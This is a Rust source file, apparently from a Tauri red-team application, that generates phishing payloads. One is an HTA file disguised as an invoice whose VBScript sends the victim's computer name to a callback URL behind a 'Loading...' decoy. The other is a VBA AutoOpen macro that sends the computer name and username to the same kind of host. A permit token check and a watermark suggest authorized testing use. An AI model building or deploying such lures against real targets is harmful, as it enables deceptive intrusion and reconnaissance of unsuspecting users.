// src-tauri/src/phishing_generator.rs
use serde::{Deserialize, Serialize};
use tauri::State;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PhishingPayload {
    pub format: String,
    pub filename: String,
    pub content_b64: String,
    pub callback_url: String,
    pub created_at: String,
    pub expires_at: String,
}

fn save_payload(filename: &str, content: &str) {
    let dir = crate::get_vault_path().join("payloads");
    let _ = std::fs::create_dir_all(&dir);
    let _ = std::fs::write(dir.join(filename), content);
}

#[tauri::command]
pub fn generate_hta_payload(
    callback_url: String,
    decoy_title: String,
    permit_token: String,
    log_state: State<'_, crate::LogState>,
) -> Result<PhishingPayload, String> {
    if permit_token.trim().len() < 8 {
        return Err("Unauthorized".to_string());
    }

    let wm = format!(
        "<!-- HYPERION permit={} {} -->",
        &permit_token[..8],
        chrono::Utc::now().to_rfc3339()
    );

    let hta = format!(
        "<html><head><title>{t}</title>\n\
<HTA:APPLICATION APPLICATIONNAME=\"{t}\" BORDER=\"none\"/>\n\
</head><body>\n{wm}\n\
<script language=\"VBScript\">\n\
Sub Window_OnLoad\n\
  On Error Resume Next\n\
  Dim x : Set x = CreateObject(\"MSXML2.XMLHTTP\")\n\
  x.Open \"GET\", \"{cb}?h=\" & CreateObject(\"WScript.Network\").ComputerName, False\n\
  x.Send\n\
  MsgBox \"Loading...\", 64, \"{t}\"\n\
  window.close\n\
End Sub\n\
</script></body></html>",
        t = decoy_title,
        wm = wm,
        cb = callback_url
    );

    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(hta.as_bytes());
    let fname = format!("Invoice_{}.hta", chrono::Utc::now().timestamp());
    save_payload(&fname, &hta);

    crate::push_runtime_log(
        &log_state,
        format!("PHISHING_HTA|{}|permit={}", fname, &permit_token[..8]),
    );

    Ok(PhishingPayload {
        format: "HTA".to_string(),
        filename: fname,
        content_b64: b64,
        callback_url,
        created_at: chrono::Utc::now().to_rfc3339(),
        expires_at: (chrono::Utc::now() + chrono::Duration::hours(48)).to_rfc3339(),
    })
}

#[tauri::command]
pub fn generate_macro_lure(
    callback_url: String,
    doc_title: String,
    permit_token: String,
    log_state: State<'_, crate::LogState>,
) -> Result<PhishingPayload, String> {
    if permit_token.trim().len() < 8 {
        return Err("Unauthorized".to_string());
    }

    let wm = format!(
        "'HYPERION permit={} {} title={}",
        &permit_token[..8],
        chrono::Utc::now().to_rfc3339(),
        doc_title
    );

    let vba = format!(
        "Attribute VB_Name = \"AutoOpen\"\n\
{wm}\n\
Sub AutoOpen()\n\
  On Error Resume Next\n\
  Dim r : Set r = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n\
  r.Open \"GET\", \"{cb}?d=\" & Environ(\"COMPUTERNAME\") & \"&u=\" & Environ(\"USERNAME\"), False\n\
  r.Send\n\
End Sub",
        wm = wm,
        cb = callback_url
    );

    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(vba.as_bytes());
    let fname = format!("Macro_{}.bas", chrono::Utc::now().timestamp());
    save_payload(&fname, &vba);

    crate::push_runtime_log(
        &log_state,
        format!("PHISHING_MACRO|{}|permit={}", fname, &permit_token[..8]),
    );

    Ok(PhishingPayload {
        format: "VBA_MACRO".to_string(),
        filename: fname,
        content_b64: b64,
        callback_url,
        created_at: chrono::Utc::now().to_rfc3339(),
        expires_at: (chrono::Utc::now() + chrono::Duration::hours(48)).to_rfc3339(),
    })
}
